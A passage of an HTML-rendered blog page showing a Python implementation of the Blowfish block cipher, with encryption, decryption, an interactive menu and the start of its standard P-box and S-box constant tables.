class="hljs-number">2</span>):<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        p_box[i] = Left<br>        p_box[i + <span class="hljs-number">1</span>] = Right<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>, <span class="hljs-number">2</span>):<br>            Left, Right = Blow_Main_Encrypt(Left, Right)<br>            s_box[i][j] = Left<br>            s_box[i][j + <span class="hljs-number">1</span>] = Right<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Encrypt</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(data) % <span class="hljs-number">8</span>:<br>        data += <span class="hljs-string">&#x27;0&#x27;</span><br>    cipher = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">8</span>):<br>        Left = (<span class="hljs-built_in">ord</span>(data[i]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">3</span>]))<br>        Right = (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">24</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">5</span>]) &lt;&lt; <span class="hljs-number">16</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">6</span>]) &lt;&lt; <span class="hljs-number">8</span>) | (<span class="hljs-built_in">ord</span>(data[i + <span class="hljs-number">7</span>]))<br>        Left, Right = Blow_Main_Encrypt(Left, Right)<br>        cipher += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        cipher += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">global</span> Encrypt<br>    Encrypt = []<br>    <span class="hljs-built_in">print</span>(cipher)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">BlowFish_Decrypt</span>(<span class="hljs-params">cipher</span>):<br>    plain = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher), <span class="hljs-number">16</span>):<br>        Left = cipher[i:i + <span class="hljs-number">8</span>]<br>        Right = cipher[i + <span class="hljs-number">8</span>:i + <span class="hljs-number">16</span>]<br>        Left = <span class="hljs-built_in">int</span>(Left, base=<span class="hljs-number">16</span>)<br>        Right = <span class="hljs-built_in">int</span>(Right, base=<span class="hljs-number">16</span>)<br><br>        Left, Right = Blow_Main_Decrypt(Left, Right)<br>        plain += <span class="hljs-built_in">hex</span>(Left)[<span class="hljs-number">2</span>:]<br>        plain += <span class="hljs-built_in">hex</span>(Right)[<span class="hljs-number">2</span>:]<br><br>    plain = <span class="hljs-built_in">int</span>(plain, base=<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(Crypto.Util.number.long_to_bytes(plain))<br>    <span class="hljs-keyword">global</span> Encrypt<br>    Encrypt = []<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ input the key First\n&quot;</span>)<br>    init_key_pbox(key)<br>    Change_Box()<br>    m = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\n&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> m == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ input the data:\n&quot;</span>)<br>            BlowFish_Encrypt(data)<br>            m = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\n&quot;</span>)<br>        <span class="hljs-keyword">if</span> m == <span class="hljs-string">&#x27;2&#x27;</span>:<br>            cipher = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ input the cipher:\n&quot;</span>)<br>            BlowFish_Decrypt(cipher)<br>            m = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;PLZ choose a model: 1.Encrypt 2.Decrypt 3.exit\n&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> m == <span class="hljs-string">&#x27;3&#x27;</span>:<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>Blow_Box</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs python">p_box = [<br>    <span class="hljs-number">0x243F6A88</span>, <span class="hljs-number">0x85A308D3</span>, <span class="hljs-number">0x13198A2E</span>, <span class="hljs-number">0x03707344</span>,<br>    <span class="hljs-number">0xA4093822</span>, <span class="hljs-number">0x299F31D0</span>, <span class="hljs-number">0x082EFA98</span>, <span class="hljs-number">0xEC4E6C89</span>,<br>    <span class="hljs-number">0x452821E6</span>, <span class="hljs-number">0x38D01377</span>, <span class="hljs-number">0xBE5466CF</span>, <span class="hljs-number">0x34E90C6C</span>,<br>    <span class="hljs-number">0xC0AC29B7</span>, <span class="hljs-number">0xC97C50DD</span>, <span class="hljs-number">0x3F84D5B5</span>, <span class="hljs-number">0xB5470917</span>,<br>    <span class="hljs-number">0x9216D5D9</span>, <span class="hljs-number">0x8979FB1B</span>]<br><br>s_box = [<br>    [<span class="hljs-number">0xD1310BA6</span>, <span class="hljs-number">0x98DFB5AC</span>, <span class="hljs-number">0x2FFD72DB</span>, <span class="hljs-number">0xD01ADFB7</span>,<br>     <span class="hljs-number">0xB8E1AFED</span>, <span class="hljs-number">0x6A267E96</span>, <span class="hljs-number">0xBA7C9045</span>, <span class="hljs-number">0xF12C7F99</span>,<br>     <span class="hljs-number">0x24A19947</span>, <span class="hljs-number">0xB3916CF7</span>, <span class="hljs-number">0x0801F2E2</span>, <span class="hljs-number">0x858EFC16</span>,<br>     <span class="hljs-number">0x636920D8</span>, <span class="hljs-number">0x71574E69</span>, <span class="hljs-number">0xA458FEA3</span>, <span class="hljs-number">0xF4933D7E</span>,<br>     <span class="hljs-number">0x0D95748F</span>, <span class="hljs-number">0x728EB658</span>, <span class="hljs-number">0x718BCD58</span>, <span class="hljs-number">0x82154AEE</span>,<br>     <span class="hljs-number">0x7B54A41D</span>, <span class="hljs-number">0xC25A59B5</span>, <span class="hljs-number">0x9C30D539</span>, <span class="hljs-number">0x2AF26013</span>,<br>     <span class="hljs-number">0xC5D1B023</span>, <span class="hljs-number">0x286085F0</span>, <span class="hljs-number">0xCA417918</span>, <span class="hljs-number">0xB8DB38EF</span>,<br>     <span class="hljs-number">0x8E79DCB0</span>, <span class="hljs-number">0x603A180E</span>, <span class="hljs-number">0x6C9E0E8B</span>, <span class="hljs-number">0xB01E8A3E</span>,<br>     <span class="hljs-number">0xD71577C1</span>, <span class="hljs-number">0xBD314B27</span>, <span class="hljs-number">0x78AF2FDA</span>, <span class="hljs-number">0x55605C60</span>,<br>     <span class="hljs-number">0xE65525F3</span>, <span class="hljs-number">0xAA55AB94</span>, <span class="hljs-number">0x57489862</span>, <span class="hljs-number">0x63E81440</span>,<br>     <span class="hljs-number">0x55CA396A</span>, <span class="hljs-number">0x2AAB10B6</span>, <span class="hljs-number">0xB4CC5C34</span>, <span class="hljs-number">0x1141E8CE</span>,<br>     <span class="hljs-number">0xA15486AF</span>, <span class="hljs-number">0x7C72E993</span>, <span class="hljs-number">0xB3EE1411</span>, <span class="hljs-number">0x636FBC2A</span>,<br>     <span class="hljs-number">0x2BA9C55D</span>, <span class="hljs-number">0x741831F6</span>, <span class="hljs-number">0xCE5C3E16</span>, <span class="hljs-number">0x9B87931E</span>,<br>     <span class="hljs-number">0xAFD6BA33</span>, <span class="hljs-number">0x6C24CF5C</span>, <span class="hljs-number">0x7A325381</span>, <span class="hljs-number">0x28958677</span>,<br>     <span class="hljs-number">0x3B8F4898</span>, <span class="hljs-number">0x6B4BB9AF</span>, <span class="hljs-number">0xC4BFE81B</span>, <span class="hljs-number">0x66282193</span>,<br>     <span class="hljs-number">0x61D809CC</span>, <span class="hljs-number">0xFB21A991</span>, <span class="hljs-number">0x487CAC60</span>, <span class="hljs-number">0x5DEC8032</span>,<br>     <span class="hljs-number">0xEF845D5D</span>, <span class="hljs-number">0xE98575B1</span>, <span class="hljs-number">0xDC262302</span>, <span class="hljs-number">0xEB651B88</span>,<br>     <span class="hljs-number">0x23893E81</span>, <span class="hljs-number">0xD396ACC5</span>, <span class="hljs-number">0x0F6D6FF3</span>, <span class="hljs-number">0x83F44239</span>,<br>     <span class="hljs-number">0x2E0B4482</span>, <span class="hljs-number">0xA4842004</span>, <span class="hljs-number">0x69C8F04A</span>, <span class="hljs-number">0x9E1F9B5E</span>,<br>     <span class="hljs-number">0x21C66842</span>, <span class="hljs-number">0xF6E96C9A</span>, <span class="hljs-number">0x670C9C61</span>, <span class="hljs-number">0xABD388F0</span>,<br>     <span class="hljs-number">0x6A51A0D2</span>, <span class="hljs-number">0xD8542F68</span>, <span class="hljs-number">0x960FA728</span>, <span class="hljs-number">0xAB5133A3</span>,<br>     <span class="hljs-number">0x6EEF0B6C</span>, <span class="hljs-number">0x137A3BE4</span>, <span class="hljs-number">0xBA3BF050</span>, <span class="hljs-number">0x7EFB2A98</span>,<br>     <span class="hljs-number">0xA1F1651D</span>, <span class="hljs-number">0x39AF0176</span>, <span class="hljs-number">0x66CA593E</span>, <span class="hljs-number">0x82430E88</span>,<br>     <span class="hljs-number">0x8CEE8619</span>, <span class="hljs-number">0x456F9FB4</span>, <span class="hljs-number">0x7D84A5C3</span>, <span class="hljs-number">0x3B8B5EBE</span>,<br>     <span class="hljs-number">0xE06F75D8</span>, <span class="hljs-number">0x85C12073</span>, <span class="hljs-number">0x401A449F</span>, <span class="hljs-number">0x56C16AA6</span>,<br>     <span class="hljs-number">0x4ED3AA62</span>, <span class="hljs-number">0x363F7706</span>, <span class="hljs-number">0x1BFEDF72</span>, <span class="hljs-number">0x429B023D</span>,<br>     <span class="hljs-number">0x37D0D724</span>, <span class="hljs-number">0xD00A1248</span>, <span class="hljs-number">0xDB0FEAD3</span>, <span class="hljs-number">0x49F1C09B</span>,<br>     <span class="hljs-number">0x075372C9</span>, <span class="hljs-number">0x80991B7B</span>, <span class="hljs-number">0x25D479D8</span>, <span class="hljs-number">0xF6E8DEF7</span>,<br>     <span class="hljs-number">0xE3FE501A</span>, <span class="hljs-number">0xB6794C3B</span>, <span class="hljs-number">0x976CE0BD</span>, <span class="hljs-number">0x04C006BA</span>,<br>     <span class="hljs-number">0xC1A94FB6</span>, <span class="hljs-number">0x409F60C4</span>, <span class="hljs-number">0x5E5C9EC2</span>, <span class="hljs-number">0x196A2463</span>,<br>     <span class="hljs-number">0x68FB6FAF</span>, <span class="hljs-number">0x3E6C53B5</span>, <span class="hljs-number">0x1339B2EB</span>, <span class="hljs-number">0x3B52EC6F</span>,<br>     <span class="hljs-number">0x6DFC511F</span>, <span class="hljs-number">0x9B30952C</span>, <span class="hljs-number">0xCC814544</span>, <span class="hljs-number">0xAF5EBD09</span>,<br>     <span class="hljs-number">0xBEE3D004</span>, <span class="hljs-number">0xDE334AFD</span>, <span class="hljs-number">0x660F2807</span>, <span class="hljs-number">0x192E4BB3</span>,<br>     <span class="hljs-number">0xC0CBA857</span>, <span class="hljs-number">0x45C8740F</span>, <span class="hljs-number">0xD20B5F39</span>, <span class="hljs-number">0xB9D3FBDB</span>,<br>     <span class="hljs-number">0x5579C0BD</span>, <span class="hljs-number">0x1A60320A</span>, <span class="hljs-number">0xD6A100C6</span>, <span class="hljs-number">0x402C7279</span>,<br>     <span class="hljs-number">0x679F25FE</span>, <span class="hljs-number">0xFB1FA3CC</span>, <span class="hljs-number">0x8EA5E9F8</span>, <span class="hljs-number">0xDB3222F8</span>,<br>     <span class="hljs-number">0x3C7516DF</span>, <span class="hljs-number">0xFD616B15</span>, <span class="hljs-number">0x2F501EC8</span>, <span class="hljs-number">0xAD0552AB</span>,<br>     <span class="hljs-number">0x323DB5FA</span>, <span class="hljs-number">0xFD238760</span>, <span class="hljs-number">0x53317B48</span>, <span class="hljs-number">0x3E00DF82</span>,<br>     <span class="hljs-number">0x9E5C57BB</span>, <span class="hljs-number">0xCA6F8CA0</span>, <span class="hljs-number">0x1A87562E</span>, <span class="hljs-number">0xDF1769DB</span>,<br>     <span class="hljs-number">0xD542A8F6</span>, <span class="hljs-number">0x287EFFC3</span>, <span class="hljs-number">0xAC6732C6</span>, <span class="hljs-number">0x8C4F5573</span>,<br>     <span class="hljs-number">0x695B27B0</span>, <span class="hljs-number">0xBBCA58C8</span>, <span class="hljs-number">0xE1FFA35D</span>, <span class="hljs-number">0xB8F011A0</span>,<br>     <span class="hljs-number">0x10FA3D98</span>, <span class="hljs-number">0xFD2183B8</span>, <span class="hljs-number">0x4AFCB56C</span>, <span class="hljs-number">0x2DD1D35B</span>,<br>     <span class="hljs-number">0x9A53E479</span>, <span class="hljs-number">0xB6F84565</span>, <span class="hljs-number">0xD28E49BC</span>, <span class="hljs-number">0x4BFB9790</span>,<br>     <span class="hljs-number">0xE1DDF2DA</span>, <span class="hljs-number">0xA4CB7E33</span>, <span class="hljs-number">0x62FB1341</span>, <span class="hljs-number">0xCEE4C6E8</span>,<br>     <span class="hljs-number">0xEF20CADA</span>, <span class="hljs-number">0x36774C01</span>, <span class="hljs-number">0xD07E9EFE</span>, <span class="hljs-number">0x2BF11FB4</span>,<br>     <span class="hljs-number">0x95DBDA4D</span>, <span class="hljs-number">0xAE909198</span>, <span class="hljs-number">0xEAAD8E71</span>, <span class="hljs-number">0x6B93D5A0</span>,<br>     <span class="hljs-number">0xD08ED1D0</span>, <span class="hljs-number">0xAFC725E0</span>, <span class="hljs-number">0x8E3C5B2F</span>, <span class="hljs-number">0x8E7594B7</span>,<br>     <span class="hljs-number">0x8FF6E2FB</span>, <span class="hljs-number">0xF2122B64</span>, <span class="hljs-number">0x8888B812</span>, <span class="hljs-number">0x900DF01C</span>,<br>     <span class="hljs-number">0x4FAD5EA0</span>, <span class="hljs-number">0x688FC31C</span>, <span class="hljs-number">0xD1CFF191</span>, <span class="hljs-number">0xB3A8C1AD</span>,<br>     <span class="hljs-number">0x2F2F2218</span>, <span class="hljs-number">0xBE0E1777</span>, <span class="hljs-number">0xEA752DFE</span>, <span class="hljs-number">0x8B021FA1</span>,<br>     <span class="hljs-number">0xE5A0CC0F</span>, <span class="hljs-number">0xB56F74E8</span>, <span class="hljs-number">0x18ACF3D6</span>, <span class="hljs-number">0xCE89E299</span>,<br>     <span class="hljs-number">0xB4A84FE0</span>, <span class="hljs-number">0xFD13E0B7</span>, <span class="hljs-number">0x7CC43B81</span>, <span class="hljs-number">0xD2ADA8D9</span>,<br>     <span class="hljs-number">0x165FA266</span>, <span class="hljs-number">0x80957705</span>, <span class="hljs-number">0x93CC7314</span>, <span class="hljs-number">0x211A1477</span>,<br>     <span class="hljs-number">0xE6AD2065</span>, <span class="hljs-number">0x77B5FA86</span>, <span class="hljs-number">0xC75442F5</span>, <span class="hljs-number">0xFB9D35CF</span>,<br>     <span class="hljs-number">0xEBCDAF0C</span>, <span class="hljs-number">0x7B3E89A0</span>, <span class="hljs-number">0xD6411BD3</span>, <span class="hljs-number">0xAE1E7E49</span>,<br>     <span class="hljs-number">0x00250E2D</span>, <span class="hljs-number">0x2071B35E</span>, <span class="hljs-number">0x226800BB</span>, <span class="hljs-number">0x57B8E0AF</span>,<br>     <span class="hljs-number">0x2464369B</span>, <span class="hljs-number">0xF009B91E</span>, <span class="hljs-number">0x5563911D</span>, <span class="hljs-number">0x59DFA6AA</span>,<br>     <span class="hljs-number">0x78C14389</span>, <span class="hljs-number">0xD95A537F</span>, <span class="hljs-number">0x207D5BA2</span>, <span class="hljs-number">0x02E5B9C5</span>,<br>     <span class="hljs-number">0x83260376</span>, <span class="hljs-number">0x6295CFA9</span>, <span class="hljs-number">0x11C81968</span>, <span class="hljs-number">0x4E734A41</span>,<br>     <span class="hljs-number">0xB3472DCA</span>, <span class="hljs-number">0x7B14A94A</span>, <span class="hljs-number">0x1B510052</span>, <span class="hljs-number">0x9A532915</span>,<br>     <span class="hljs-number">0xD60F573F</span>, <span class="hljs-number">0xBC9BC6E4</span>, <span class="hljs-number">0x2B60A476</span>, <span class="hljs-number">0x81E67400</span>,<br>     <span class="hljs-number">0x08BA6FB5</span>, <span class="hljs-number">0x571BE91F</span>, <span class="hljs-number">0xF296EC6B</span>, <span class="hljs-number">0x2A0DD915</span>,<br>     <span class="hljs-number">0xB6636521</span>, <span class="hljs-number">0xE7B9F9B6</span>, <span class="hljs-number">0xFF34052E</span>, <span class="hljs-number">0xC5855664</span>,<br>     <span class="hljs-number">0x53B02D5D</span>, <span class="hljs-number">0xA99F8FA1</span>, <span class="hljs-number">0x08BA4799</span>, <span class="hljs-number">0x6E85076A</span>],<br>    [<span class="hljs-number">0x4B7A70E9</span>, <span class="hljs-number">0xB5B32944</span>, <span class="hljs-number">0xDB75092E</span>, <span class="hljs-number">0xC4192623</span>,<br>     <span class="hljs-number">0xAD6EA6B0</span>, <span class="hljs-number">0x49A7DF7D</span>, <span class="hljs-number">0x9CEE60B8</span>, <span class="hljs-number">0x8FEDB266</span>,<br>     <span class="hljs-number">0xECAA8C71</span>, <span class="hljs-number">0x699A17FF</span>, <span class="hljs-number">0x5664526C</span>, <span class="hljs-number">0xC2B19EE1</span>,<br>     <span class="hljs-number">0x193602A5</span>, <span class="hljs-number">0x75094C29</span>, <span class="hljs-number">0xA0591340</span>, <span class="hljs-number">0xE4183A3E</span>,<br>     <span class="hljs-number">0x3F54989A</span>, <span class="hljs-number">0x5B429D65</span>, <span class="hljs-number">0x6B8FE4D6</span>, <span class="hljs-number">0x99F73FD6</span>,<br>     <span class="hljs-number">0xA1D29C07</span>, <span class="hljs-number">0xEFE830F5</span>, <span class="hljs-number">0x4D2D38E6</span>, <span class="hljs-number">0xF0255DC1</span>,<br>     <span class="hljs-number">0x4CDD2086</span>, <span class="hljs-number">0x8470EB26</span>, <span class="hljs-number">0x6382E9C6</span>, <span class="hljs-number">0x021ECC5E</span>,<br>     <span class="hljs-number">0x09686B3F</span>, <span class="hljs-number">0x3EBAEFC9</span>, <span class="hljs-number">0x3C971814</span>, <span class="hljs-number">0x6B6A70A1</span>,<br>     <span class="hljs-number">0x687F3584</span>, <span class="hljs-number">0x52A0E286</span>, <span class="hljs-number">0xB79C5305</span>, <span class="hljs-number">0xAA500737</span>,<br>     <span class="hljs-number">0x3E07841C</span>, <span class="hljs-number">0x7FDEAE5C</span>, <span class="hljs-number">0x8E7D44EC</span>, <span class="hljs-number">0x5716F2B8</span>,<br>     <span class="hljs-number">0xB03ADA37</span>, <span class="hljs-number">0xF0500C0D</span>, <span class="hljs-number">0xF01C1F04</span>, <span class="hljs-number">0x0200B3FF</span>,<br>     <span class="hljs-number">0xAE0CF51A</span>, <span class="hljs-number">0x3CB574B2</span>, <span class="hljs-number">0x25837A58</span>, <span class="hljs-number">0xDC0921BD</span>,<br>     <span class="hljs-number">0xD19113F9</span>, <span class="hljs-number">0x7CA92FF6</span>, <span class="hljs-number">0x94324773</span>, <span class="hljs-number">0x22F54701</span>,<br>     <span class="hljs-number">0x3AE5E581</span>, <span class="hljs-number">0x37C2DADC</span>, <span class="hljs-number">0xC8B57634</span>, <span class="hljs-number">0x9AF3DDA7</span>,<br>     <span class="hljs-number">0xA9446146</span>, <span class="hljs-number">0x0FD0030E</span>, <span class="hljs-number">0xECC8C73E</span>, <span class="hljs-number">0xA4751E41</span>,<br>     <span class="hljs-number">0xE238CD99</span>, <span class="hljs-number">0x3BEA0E2F</span>, <span class="hljs-number">0x3280BBA1</span>, <span class="hljs-number">0x183EB331</span>,<br>     <span class="hljs-number">0x4E548B38</span>, <span class="hljs-number">0x4F6DB908</span>, <span class="hljs-number">0x6F420D03</span>, <span class="hljs-number">0xF60A04BF</span>,<br>     <span class="hljs-number">0x2CB81290</span>, <span class="hljs-number">0x24977C79</span>, <span class="hljs-number">0x5679B072</span>, <span class="hljs-number">0xBCAF89AF</span>,<br>     <span class="hljs-number">0xDE9A771F</span>, <span class="hljs-number">0xD9930810</span>, <span class="hljs-number">0xB38BAE12</span>, <span class="hljs-number">0xDCCF3F2E</span>,<br>     <span class="hljs-number">0x5512721F</span>, <span class="hljs-number">0x2E6B7124</span>, <span class="hljs-number">0x501ADDE6</span>, <span class="hljs-number">0x9F84CD87</span>,<br>     <span class="hljs-number">0x7A584718</span>, <span class="hljs-number">0x7408DA17</span>, <span class="hljs-number">0xBC9F9ABC</span>, <span class="hljs-number">0xE94B7D8C</span>,<br>     <span class="hljs-number">0xEC7AEC3A</span>, <span class="hljs-number">0xDB851DFA</span>, <span class="hljs-number">0x63094366</span>, <span class="hljs-number">0xC464C3D2</span>,<br>     <span class="hljs-number">0xEF1C1847</span>, <span class="hljs-number">0x3215D908</span>, <span class="hljs-number">0xDD433B37</span>, <span class="hljs-number">0x24C2BA16</span>,<br>     <span class="hljs-number">0x12A14D43</span>, <span class="hljs-number">0x2A65C451</span>, <span class="hljs-number">0x50940002</span>, <span class="hljs-number">0x133AE4DD</span>,<br>     <span class="hljs-number">0x71DFF89E</span>, <span class="hljs-number">0x10314E55</span>, <span class="hljs-number">0x81AC77D6</span>, <span class="hljs-number">0x5F11199B</span>,<br>     <span class="hljs-number">0x043556F1</span>, <span class="hljs-number">0xD7A3C76B</span>, <span class="hljs-number">0x3C11183B</span>, <span class="hljs-number">0x5924A509</span>,<br>     <span class="hljs-number">0xF28FE6ED</span>, <span class="hljs-number">0x97F1FBFA</span>, <span class="hljs-number">0x9EBABF2C</span>, <span class="hljs-number">0x1E153C6E</span>,<br>     <span class="hljs-number">0x86E34570</span>, <span class="hljs-number">0xEAE96FB1</span>, <span class="hljs-number">0x860E5E0A</span>, <span class="hljs-number">0x5A3E2AB3</span>,<br>     <span class="hljs-number">0x771FE71C</span>, <span class="hljs-number">0x4E3D06FA</span>, <span class="hljs-number">0x2965DCB9</span>, <span class="hljs-number">0x99E71D0F</span>,<br>     <span class="hljs-number">0x803E89D6</span>, <span class="hljs-number">0x5266C825</span>, <span class="hljs-number">0x2E4CC978</span>, <span class="hljs-number">0x9C10B36A</span>,<br>     <span class="hljs-number">0xC6150EBA</span>, <span class="hljs-number">0x94E2EA78</span>, <span class="hljs-number">0xA5FC3C53</span>, <span class="hljs-number">0x1E0A2DF4</span>,<br>     <span class="hljs-number">0xF2F74EA7</span>, <span class="hljs-number">0x361D2B3D</span>, <span class="hljs-number">0x1939260F</span>, <span class="hljs-number">0x19C27960</span>,<br>     <span class="hljs-number">0x5223A708</span>, <span class="hljs-number">0xF71312B6</span>, <span class="hljs-number">0xEBADFE6E</span>, <span class="hljs-number">0xEAC31F66</span>,<br>     <span class="hljs-number">0xE3BC4595</span>, <span class="hljs-number">0xA67BC883</span>, <span class="hljs-number">0xB17F37D1</span>, <span class="hljs-number">0x018CFF28</span>,<br>     <span class="hljs-number">0xC332DDEF</span>, <span class="hljs-number">0xBE6C5AA5</span>, <span class="hljs-number">0x65582185</span>, <span class="hljs-number">0x68AB9802</span>,<br>     <span 